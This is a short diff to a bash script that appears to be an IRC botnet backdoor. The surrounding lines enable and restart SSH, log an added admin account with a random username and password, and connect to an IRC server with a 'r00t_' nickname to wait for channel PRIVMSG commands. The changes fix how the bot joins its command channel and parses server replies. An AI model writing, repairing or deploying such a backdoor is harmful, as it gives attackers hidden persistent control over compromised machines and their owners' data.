@@ -24,6 +24,7 @@ if [ -f /usr/bin/apt ]; then service ssh restart && systemctl enable ssh; fi;
 arr4y="Added admin:, $random_user, password:, $random_number";
 echo "NICK r00t_$random_user" > input 
 echo "USER $user" >> input
+echo "JOIN #$channel" >> input
 tail -f input | telnet $server 6667 | while read; do
   set -- ${REPLY//$'\r'/}
 
@@ -31,8 +32,9 @@ tail -f input | telnet $server 6667 | while read; do
   # otherwise the server will disconnect us
   [ "$1" == "PING" ] && echo "PONG $2" >> input
   
-  if [ "$1" == "001" ] ; then
-    echo $* && echo "JOIN #$channel" >> input
+  if [ "$2" == "001" ] ; then
+    echo $*
+    echo "JOIN #$channel" >> input
   fi
 
   if [ "$2" == "PRIVMSG" ] ; then
